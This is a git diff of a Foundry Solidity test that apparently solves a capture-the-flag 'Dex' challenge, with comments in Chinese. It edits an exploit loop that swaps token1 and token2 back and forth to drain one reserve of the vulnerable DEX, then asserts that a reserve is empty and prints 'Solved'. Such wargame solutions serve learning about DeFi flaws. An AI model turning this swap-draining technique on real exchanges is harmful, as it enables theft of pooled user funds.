@@ -68,10 +68,12 @@ contract DexEXP is Test {
                 if (expectedToken2 > dexToken2Balance) {
                     // 调整输入量，确保不超过 Dex 的 token2 余额
                     swapAmount = (dexToken2Balance * dexToken1Balance) / dexToken2Balance;
-                    if (swapAmount == 0 || swapAmount > userToken1Balance) break;
+                    if (swapAmount > userToken1Balance) break;
                 }
-                dex.swap(token1, token2, swapAmount);
-                showBalances();
+                if(swapAmount > 0){
+                    dex.swap(token1, token2, swapAmount);
+                    showBalances();
+                }
             }
 
             // Swap token2 -> token1
@@ -81,19 +83,21 @@ contract DexEXP is Test {
                 if (expectedToken1 > dexToken1Balance) {
                     // 调整输入量，确保不超过 Dex 的 token1 余额
                     swapAmount = (dexToken1Balance * dexToken2Balance) / dexToken1Balance;
-                    if (swapAmount == 0 || swapAmount > userToken2Balance) break;
+                    if (swapAmount > userToken2Balance) break;
                 }
-                dex.swap(token2, token1, swapAmount);
-                showBalances();
+                if(swapAmount > 0){
+                    dex.swap(token2, token1, swapAmount);
+                    showBalances();
+                }
             }
         }
 
-        // 验证目标达成
+        dex.swap(token2,token1,14);
+        showBalances();
         uint256 dexToken1Final = IERC20(token1).balanceOf(address(dex));
         uint256 dexToken2Final = IERC20(token2).balanceOf(address(dex));
-        console.log("Final Dex token1 balance:", dexToken1Final);
-        console.log("Final Dex token2 balance:", dexToken2Final);
-        // assert(dexToken1Final == 0 || dexToken2Final == 0);
+        assert(dexToken1Final == 0 || dexToken2Final == 0);
+        console.log("[+] Solved!");
 
         vm.stopPrank();
     }
